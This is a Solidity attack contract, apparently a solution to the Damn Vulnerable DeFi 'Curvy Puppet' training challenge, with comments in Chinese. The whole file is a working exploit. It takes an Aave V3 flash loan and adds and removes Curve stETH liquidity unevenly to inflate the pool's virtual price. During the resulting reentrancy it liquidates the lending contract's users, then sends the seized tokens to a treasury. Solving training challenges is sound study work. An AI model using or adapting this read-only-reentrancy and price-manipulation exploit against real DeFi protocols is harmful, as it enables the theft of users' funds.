// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {console} from "forge-std/console.sol";

// 接口定义
interface IWSTETH is IERC20 {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// 自定义错误
error InsufficientWstETHForRepayment(uint256 currentBalance, uint256 requiredAmount);
error StETHSubmitFailed();

/// @title AttackCurvyPuppet
/// @notice Flashloan attack contract optimized for clarity and modularity.
/// @dev Contains internal helper functions to streamline the liquidity and wrapping operations.
contract AttackCurvyPuppet is IFlashLoanReceiver {
    IERC20 public immutable stETH;
    IWSTETH public immutable wstETH = IWSTETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0); // wstETH Mainnet
    ILendingPool constant public aaveV3pool = ILendingPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2); // Aave V3 Pool Mainnet
    IStableSwap public immutable curvePool;
    WETH public immutable weth;
    bool private _handle_receive = false; // 用于控制 receive() 函数的逻辑只执行一次攻击核心部分
    address[3] public users; // 需要清算的用户地址数组
    CurvyPuppetLending public lending; // 目标借贷合约
    DamnValuableToken public dvt; // 抵押品代币 (DamnValuableToken)
    IERC20 public lp_token; // Curve 池的 LP 代币
    IPermit2 public permit2; // Permit2 合约地址
    address public treasury;

    constructor(
        IERC20 _stETH,
        IStableSwap _curvePool,
        WETH _weth,
        address[3] memory _users,
        CurvyPuppetLending _lending,
        DamnValuableToken _dvt,
        IERC20 _lp_token,
        IPermit2 _permit2,
        address _treasury
    ) {
        stETH = _stETH;
        curvePool = _curvePool;
        weth = _weth;
        users = _users;
        lending = _lending;
        dvt = _dvt;
        lp_token = _lp_token;
        permit2 = _permit2;
        treasury = _treasury;
    }

    // 接收 ETH 的 receive() 函数，在特定重入时执行清算
    receive() external payable {
        if (_handle_receive) { // 确保核心清算逻辑只在第一次重入时执行
            console.log("Virtual Price after attack:", curvePool.get_virtual_price());
            uint256 currentLpBalance = lp_token.balanceOf(address(this));
            
            // 为 Permit2 批准 LP 代币
            lp_token.approve(address(permit2), currentLpBalance);
            // Permit2 批准借贷合约使用 LP 代币
            permit2.approve({
                token: address(lp_token),
                spender: address(lending),
                amount: uint160(currentLpBalance), // 注意: Permit2 amount 是 uint160，可能截断
                expiration: uint48(block.timestamp) // 或者一个更长的过期时间
            });

            // 清算所有目标用户
            for (uint256 i = 0; i < users.length; i++) {
                lending.liquidate(users[i]);
            }
            _handle_receive = false;
        } else {
            // 后续的 receive 调用（例如第二次移除流动性时）不执行任何操作
        }
    }

    /// @notice 启动闪电贷攻击
    function attack() public payable {
        address[] memory assets = new address[](1);
        assets[0] = address(wstETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 200000 ether; // 借入大量的 wstETH (根据实际需要调整具体数值)

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0; // 无债务模式，必须在同一交易内偿还

        // 调用 Aave V3 Pool 发起闪电贷，回调到本合约的 executeOperation 函数
        aaveV3pool.flashLoan(
            address(this),    // receiverAddress - 接收贷款并执行操作的合约
            assets,           // assets - 借款资产数组
            amounts,          // amounts - 对应资产数量数组
            modes,            // modes - 利率模式数组 (闪电贷通常为0)
            address(this),    // onBehalfOf - 代表谁借款 (通常是 receiverAddress)
            "",               // params - 传递给回调函数的额外参数 (这里为空)
            0                 // referralCode - 推荐码 (通常为0)
        );
        
        // 将合约中剩余的 WSTETH：
        // 1) 先 unwrap → STETH
        // 2) 用 Curve 把 STETH 换成 ETH
        // 3) 将得到的 ETH wrap → WETH
        uint256 remainingWstETH = wstETH.balanceOf(address(this));
        if (remainingWstETH > 0) {
            // 1. Unwrap WSTETH to STETH. unwrap() returns the amount of stETH received.
            uint256 stEthAmount = wstETH.unwrap(remainingWstETH);

            if (stEthAmount > 0) {
                // 2. Approve Curve pool to spend the stETH
                stETH.approve(address(curvePool), stEthAmount);

                // 3. Exchange stETH for ETH in Curve pool
                // Assuming stETH is coin index 1 and ETH is coin index 0.
                // min_dy is set to 0 for simplicity in this attack context.
                uint256 ethBalanceBeforeSwap = address(this).balance;
                curvePool.exchange(1, 0, stEthAmount, 0); // Sells stETH (index 1) for ETH (index 0)
                uint256 ethObtained = address(this).balance - ethBalanceBeforeSwap;

                if (ethObtained > 0) {
                    // 4. Wrap the obtained ETH into WETH
                    weth.deposit{value: ethObtained}();
                }
            }
        }
        
        console.log("Dvt balance of attack contract:", dvt.balanceOf(address(this)));
        console.log("LP token balance of attack contract:", lp_token.balanceOf(address(this)));
        console.log("ETH balance of attack contract:", address(this).balance);
        console.log("WETH balance of attack contract:", weth.balanceOf(address(this)));
        console.log("WSTETH balance of attack contract:", wstETH.balanceOf(address(this)));
        console.log("STETH balance of attack contract:", stETH.balanceOf(address(this)));
        dvt.transfer(address(treasury), dvt.balanceOf(address(this)));
        weth.transfer(address(treasury), weth.balanceOf(address(this)));
        lp_token.transfer(address(treasury), lp_token.balanceOf(address(this)));
    }

    /// @notice Aave V3 Pool 在提供闪电贷后调用的回调函数
    /// @dev 执行价格操纵、清算，并准备偿还闪电贷
    function executeOperation(
        address[] calldata assets, // assets[0] 是 wstETH 地址
        uint256[] calldata amounts, // amounts[0] 是借入的 wstETH 数量 (borrowedWstETHAmount)
        uint256[] calldata fees,    // fees[0] 是 wstETH 的闪电贷费用
        address _initiator,       // 闪电贷发起者 (本例中是 address(this))
        bytes calldata _params       // 从 flashLoan 调用中传递的 params
    ) external override returns (bool) {
        console.log("Virtual Price before attack:", curvePool.get_virtual_price());
        uint256 borrowedWstETHAmount = amounts[0];
        uint256 flashLoanFee = fees[0];

        // 1. 解包 wstETH -> stETH
        wstETH.unwrap(borrowedWstETHAmount);
        uint256 stETHFromUnwrap = stETH.balanceOf(address(this));

        // 2. 与 Curve 池交互以操纵价格
        // 2a. 添加流动性：将所有解包的 stETH 单边添加到 Curve 池
        stETH.approve(address(curvePool), stETHFromUnwrap);
        uint256[2] memory depositAmounts = [uint256(0), stETHFromUnwrap]; // [ETH, stETH]
        curvePool.add_liquidity(depositAmounts, 0); // 0 min_mint_amount

        // 2b. 不平衡移除流动性：取回大部分 stETH 和 1 wei ETH 以触发 receive()
        uint256 lpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
        IERC20(curvePool.lp_token()).approve(address(curvePool), lpTokenBalance);
        // 尝试取回接近原始存入 stETH 数量的 99.5% (stETHFromUnwrap * 995 / 1000)
        // 和 1 wei ETH 以触发 receive() 函数中的清算逻辑
        _handle_receive = true;
        curvePool.remove_liquidity_imbalance([uint256(1), (stETHFromUnwrap * 995) / 1000], lpTokenBalance);
        // 清算逻辑在上面的 receive() 函数中执行（当 _handle_receive == true 时，第一次重入触发）

        // 2c. 清理可能残留的 LP 代币
        // 如果担心 remove_liquidity_imbalance 后有 LP 代币残留，可以再调用一次 remove_liquidity
        // _handle_receive 此时已被置为 false，不会再次触发核心清算逻辑
        // 保留一点LP token用于还给treasury
        uint256 remainingLpTokenBalance = IERC20(curvePool.lp_token()).balanceOf(address(this));
        if (remainingLpTokenBalance > 0) {
            IERC20(curvePool.lp_token()).approve(address(curvePool), remainingLpTokenBalance);
            uint256[2] memory minAmountsOut = [uint256(0), uint256(0)];
            curvePool.remove_liquidity(remainingLpTokenBalance - 100000, minAmountsOut);
        }
        
        // 3. 使用合约中所有的 ETH (可能来自 WETH 解包或之前操作) 铸造额外的 stETH
        _mintStEthWithContractEth(); // 此函数会处理 WETH->ETH->stETH 的转换

        // 4. 将合约中所有可用的 stETH 包装成 wstETH 用于还款
        uint256 totalStETHToWrap = stETH.balanceOf(address(this));
        if (totalStETHToWrap > 0) {
            stETH.approve(address(wstETH), totalStETHToWrap);
            wstETH.wrap(totalStETHToWrap);
        }

        // 5. 准备并批准偿还闪电贷 (本金 + 手续费)
        uint256 currentWstETHBalance = wstETH.balanceOf(address(this));
        uint256 wstETHToRepay = borrowedWstETHAmount + flashLoanFee;

        if (currentWstETHBalance < wstETHToRepay) {
            revert InsufficientWstETHForRepayment(currentWstETHBalance, wstETHToRepay);
        }
        wstETH.approve(address(aaveV3pool), wstETHToRepay); // Aave 会通过 transferFrom 取款

        return true;
    }

    /// @notice 内部辅助函数：将本合约所有的 ETH 用于铸造 stETH。
    function _mintStEthWithContractEth() internal {
        // 使用本合约账户中所有的 ETH 余额去 Lido 的 stETH 合约铸造 stETH
        uint256 ethBalanceInContract = address(this).balance;
        if (ethBalanceInContract > 0) {
            // 调用 stETH 合约的 submit 函数 (通常是 payable，接收 ETH 并铸造 stETH)
            // 传入 address(0) 作为 referral（推荐人地址），铸造出的 stETH 会发给 msg.sender（本合约）
            (bool success, ) = address(stETH).call{value: ethBalanceInContract}(abi.encodeWithSignature("submit(address)", address(0)));
            if (!success) {
                revert StETHSubmitFailed();
            }
        }
        // 此函数执行后，本合约的 stETH 余额会增加，ETH 余额会用尽 (或大幅减少)。
    }
}
